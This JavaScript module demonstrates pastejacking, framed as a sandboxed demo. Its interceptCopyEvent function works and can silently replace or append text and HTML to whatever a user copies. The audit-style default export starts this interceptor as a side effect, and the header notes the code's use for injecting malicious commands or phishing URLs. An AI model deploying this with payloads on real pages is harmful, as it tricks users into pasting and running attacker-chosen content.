/**
 * pastejack.js — Clipboard Interception (Live Demo, Sandboxed)
 *
 * Real attack: silently replaces or appends text to anything the user copies,
 * e.g., injecting a malicious command or phishing URL. Every copy event is
 * logged to the console, and a small banner appears on the page warning that
 * the clipboard was altered.
 *
 * Default export: Pinpoint `Clipboard_API_Audit` (API support check).
 */

// ---------------------------------------------------------------------------
// 1. Clipboard payload injector (local demonstration only)
// ---------------------------------------------------------------------------

/**
 * Intercepts copy events and modifies the clipboard data. In this
 * demonstration, a harmless warning is appended to any copied text,
 * and the event is logged locally.
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.textPayload='']          – text to inject (if empty, original is kept)
 * @param {string}   [options.htmlPayload='']          – HTML payload
 * @param {boolean}  [options.preserveOriginal=false]  – if true, append payload; else replace
 * @param {boolean}  [options.allowOnce=false]         – stop after first copy
 * @returns {Function} cleanup function
 */
export function interceptCopyEvent(options = {}) {
    const {
        textPayload = '',
        htmlPayload = '',
        preserveOriginal = false,
        allowOnce = false,
    } = options;

    const hasTextPayload = typeof textPayload === 'string' && textPayload.length > 0;
    const hasHtmlPayload = typeof htmlPayload === 'string' && htmlPayload.length > 0;

    function onCopy(event) {
        if (!event.clipboardData) return;
        const cd = event.clipboardData;
        const originalText = cd.getData('text/plain') || '';

        // Build the new text
        let newText = originalText;
        if (hasTextPayload) {
            if (preserveOriginal) {
                newText = originalText + textPayload;
            } else {
                newText = textPayload;
            }
        }

        // Build the new HTML
        let newHtml = cd.getData('text/html') || '';
        if (hasHtmlPayload) {
            if (preserveOriginal) {
                newHtml = newHtml + htmlPayload;
            } else {
                newHtml = htmlPayload;
            }
        }

        // Set the modified data
        if (newText !== originalText || hasTextPayload) {
            cd.setData('text/plain', newText);
        }
        if (hasHtmlPayload && newHtml) {
            cd.setData('text/html', newHtml);
        }

        // Log the hijack locally
        console.log('[pastejack] Copy event intercepted!');
        console.log('  Original text:', originalText.substring(0, 200));
        if (hasTextPayload) console.log('  New text:', newText.substring(0, 200));

        // Show a temporary banner to visually alert (only once per page)
        if (!document.getElementById('__pastejack_banner')) {
            const banner = document.createElement('div');
            banner.id = '__pastejack_banner';
            banner.style.cssText =
                'position:fixed;top:0;left:0;width:100%;background:#d32f2f;color:white;text-align:center;' +
                'padding:8px;z-index:999999;font-family:sans-serif;font-size:14px;';
            banner.textContent = '⚠️ DEMO: Your copied content was modified by pastejack.js';
            document.body.prepend(banner);
            setTimeout(() => banner.remove(), 4000);
        }

        if (allowOnce) {
            document.removeEventListener('copy', onCopy, true);
        }
    }

    document.addEventListener('copy', onCopy, true);

    return function stopIntercept() {
        document.removeEventListener('copy', onCopy, true);
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'pastejack',
    title: 'Clipboard_API_Audit',
    level: 3,
    info: 'Audits navigator.clipboard support and permission states (clipboard-read, clipboard-write).',
    steps: [
        'Check navigator.clipboard existence.',
        'Query clipboard permission states via navigator.permissions.query.',
    ],
    run: async () => {
        // Trigger live demonstration
        interceptCopyEvent();

        const supported = typeof navigator.clipboard !== 'undefined';
        let readPermission = 'unknown';
        let writePermission = 'unknown';

        if (navigator.permissions && navigator.permissions.query) {
            try {
                const readStatus = await navigator.permissions.query({ name: 'clipboard-read' });
                readPermission = readStatus.state;
            } catch (e) {
                readPermission = 'not_queriable';
            }
            try {
                const writeStatus = await navigator.permissions.query({ name: 'clipboard-write' });
                writePermission = writeStatus.state;
            } catch (e) {
                writePermission = 'not_queriable';
            }
        }

        return {
            clipboardApiSupported: supported,
            readTextSupported: supported && typeof navigator.clipboard.readText === 'function',
            writeTextSupported: supported && typeof navigator.clipboard.writeText === 'function',
            permissions: {
                read: readPermission,
                write: writePermission,
            },
        };
    },
};

export default pinpointModule;